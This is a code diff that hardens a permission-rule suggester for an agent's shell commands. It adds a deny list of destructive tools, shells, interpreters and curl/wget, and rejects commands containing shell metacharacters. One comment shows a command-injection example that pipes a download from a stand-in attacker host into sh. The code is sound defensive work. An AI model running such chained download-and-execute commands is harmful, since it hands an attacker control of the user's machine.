@@ -36,8 +36,21 @@ export function suggestRule(key: string): string | undefined {
 
   if (kind === "run_command") {
     const first = subject.trim().split(/\s+/)[0];
-    // Never offer to widen a dangerous command.
-    if (!first || /^(rm|dd|mkfs|shutdown|reboot|poweroff|format)$/i.test(first)) return undefined;
+    /*
+     * Never offer to widen these. The destructive ones need no explanation; the
+     * interpreters and privilege escalators are here because "sudo *" or
+     * "bash *" is not a class of command, it is every command — approving them
+     * would hand over the machine under a reassuring label.
+     */
+    const noWiden =
+      /^(rm|dd|mkfs|shutdown|reboot|poweroff|format|sudo|su|doas|runas|bash|sh|zsh|fish|csh|cmd|powershell|pwsh|python|python3|perl|ruby|node|deno|bun|env|xargs|eval|exec|nohup|curl|wget)$/i;
+    if (!first || noWiden.test(first)) return undefined;
+    /*
+     * A shell metacharacter means the "class" is a lie: `run_command:npm *`
+     * would also match `npm test; curl evil.example | sh`. Widening only makes
+     * sense when the command is a plain argv.
+     */
+    if (/[;&|`$><\n]/.test(subject)) return undefined;
     // Don't widen a single-token command (nothing to generalise).
     if (subject.trim() === first) return undefined;
     return `${kind}:${first} *`;
